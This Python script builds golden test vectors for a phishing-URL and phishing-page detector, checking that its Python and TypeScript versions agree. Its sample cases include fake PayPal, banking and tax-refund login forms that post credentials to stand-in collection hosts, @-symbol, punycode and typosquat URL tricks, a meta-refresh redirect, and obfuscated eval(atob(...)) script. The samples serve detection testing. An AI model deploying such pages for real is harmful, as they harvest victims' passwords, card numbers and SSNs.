"""
Generates golden test vectors for parity verification between Python and TypeScript.
Exports test cases and computed feature vectors to golden_vectors.json.
"""

import json
import os
import sys

# Add ml directory to sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "ml")))

from src.features.extractor import FeatureExtractor
from src.features.schema import FEATURE_NAMES

TEST_CASES = [
    # 1. Clean benign Google homepage
    {
        "id": "benign_google",
        "url": "https://www.google.com/search?q=cybersecurity",
        "html": "<!DOCTYPE html><html><head><title>Google Search</title></head><body><input type='text' name='q' /><a href='https://www.google.com/about'>About</a></body></html>",
        "context": {"is_tranco_top_10k": True, "tls_validity_days": 180}
    },
    # 2. Stage 1 evaluation only (HTML is None)
    {
        "id": "stage1_unknown_url",
        "url": "https://suspicious-billing-portal.top/verify?id=98765",
        "html": None,
        "context": {"redirect_hop_count": 2, "redirect_cross_domain": True}
    },
    # 3. Subdomain brand spoofing PayPal on attacker apex
    {
        "id": "paypal_subdomain_phish",
        "url": "https://login.paypal.com.security-alerts.xyz/cgi-bin/webscr",
        "html": """<html><head><title>PayPal Security Login</title></head><body>
            <form action='https://drop-box-receiver.xyz/post.php' method='POST'>
                <input type='email' name='user_email' />
                <input type='password' name='passwd' />
                <input type='submit' value='Log In' />
            </form>
            <script src='https://www.paypalobjects.com/webstatic/js/main.js'></script>
            <img src='https://www.paypalobjects.com/webstatic/icon/logo.png' />
        </body></html>""",
        "context": {"redirect_hop_count": 1}
    },
    # 4. IP-as-host on non-standard port with insecure submission
    {
        "id": "ip_host_anomalous_port",
        "url": "http://192.168.1.105:8080/bank/login.html",
        "html": """<html><head><title>Online Banking</title></head><body>
            <form action='http://192.168.1.105:8080/steal.php' method='POST'>
                <input type='text' name='username' />
                <input type='password' name='password' />
            </form>
        </body></html>""",
        "context": {"has_mixed_content": True}
    },
    # 5. Punycode IDN homoglyph
    {
        "id": "punycode_homoglyph",
        "url": "https://xn--e1afmkfd.com/account/login",
        "html": """<html><head><title>Sign In</title></head><body>
            <input type='password' name='pass' />
        </body></html>""",
        "context": {}
    },
    # 6. Userinfo delimiter @ trick
    {
        "id": "at_symbol_credential_trap",
        "url": "https://www.microsoft.com@attacker-portal.net/login.srf",
        "html": "<html><head><title>Office 365</title></head><body><input type='password' /></body></html>",
        "context": {}
    },
    # 7. Double-slash open redirect
    {
        "id": "double_slash_redirect_trick",
        "url": "https://safe-domain.org//evil-phishing-target.xyz/login",
        "html": "<html><body><p>Redirecting...</p></body></html>",
        "context": {"redirect_hop_count": 3, "redirect_cross_domain": True, "protocol_downgraded": True}
    },
    # 8. Known URL shortener
    {
        "id": "shortener_hop",
        "url": "https://bit.ly/3xZyWq1",
        "html": None,
        "context": {"redirect_hop_count": 1}
    },
    # 9. High entropy domain
    {
        "id": "high_entropy_dga",
        "url": "https://zq987w12vxlmk34p.top/index.php",
        "html": None,
        "context": {}
    },
    # 10. Typosquatting brand (Levenshtein distance 1 to 'paypal')
    {
        "id": "typosquat_paypa1",
        "url": "https://paypa1.com/signin",
        "html": """<html><head><title>PayPal</title></head><body>
            <form action='https://paypa1.com/verify' method='POST'>
                <input type='email' id='login_email' />
                <input type='password' id='login_password' />
            </form>
        </body></html>""",
        "context": {}
    },
    # 11. Extreme identity theft combination: Password + Card + SSN
    {
        "id": "sensitive_combo_identity_theft",
        "url": "https://tax-refund-gov.xyz/claim",
        "html": """<html><head><title>Tax Refund Portal</title></head><body>
            <form action='https://tax-refund-gov.xyz/submit' method='POST'>
                <input type='password' name='user_pin' />
                <input type='text' name='credit_card_number' />
                <input type='text' name='ssn_number' />
            </form>
        </body></html>""",
        "context": {}
    },
    # 12. Obfuscated JavaScript & anti-analysis (context menu disabled)
    {
        "id": "anti_analysis_obfuscated",
        "url": "https://security-verify-session.net/auth",
        "html": """<html oncontextmenu='return false;'><head><title>Session Check</title></head><body>
            <script>
                var _0x1 = eval(atob("YWxlcnQoMSk="));
                var _0x2 = unescape("%20");
            </script>
            <input type='password' name='pwd' />
        </body></html>""",
        "context": {}
    },
    # 13. Dead/empty links & mismatched anchor URLs
    {
        "id": "dead_links_mismatched_anchors",
        "url": "https://chase-bank-verify.info/login",
        "html": """<html><head><title>Chase Online</title></head><body>
            <a href='#'>Forgot Password</a>
            <a href='javascript:void(0)'>Privacy Notice</a>
            <a href='https://phishing-catcher.com/trap'>https://www.chase.com/secure</a>
            <form action='https://chase-bank-verify.info/auth' method='POST'>
                <input type='text' name='username' />
                <input type='password' name='password' />
            </form>
        </body></html>""",
        "context": {}
    },
    # 14. Meta refresh redirect
    {
        "id": "meta_refresh_redirect",
        "url": "https://landing-gate.com/welcome",
        "html": "<html><head><meta http-equiv='refresh' content='2;url=https://fake-login.com' /></head><body></body></html>",
        "context": {}
    },
    # 15. Benign multi-part TLD with clean forms
    {
        "id": "benign_co_uk",
        "url": "https://portal.service.gov.uk/dashboard",
        "html": """<html><head><title>UK Government Service</title></head><body>
            <form action='https://portal.service.gov.uk/auth' method='POST'>
                <input type='text' name='gov_id' />
                <input type='password' name='passcode' />
            </form>
        </body></html>""",
        "context": {"is_tranco_top_10k": True, "tls_validity_days": 365}
    }
]

def main():
    output = {
        "feature_names": FEATURE_NAMES,
        "feature_count": len(FEATURE_NAMES),
        "test_vectors": []
    }

    for case in TEST_CASES:
        vector = FeatureExtractor.extract_features(
            url=case["url"],
            html_content=case["html"],
            context=case["context"]
        )
        output["test_vectors"].append({
            "id": case["id"],
            "url": case["url"],
            "html": case["html"],
            "context": case["context"],
            "expected_vector": vector
        })

    out_dir = os.path.dirname(__file__)
    os.makedirs(out_dir, exist_ok=True)
    out_path = os.path.join(out_dir, "golden_vectors.json")

    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2)

    print(f"Successfully generated {len(TEST_CASES)} golden test vectors to {out_path}")

if __name__ == "__main__":
    main()
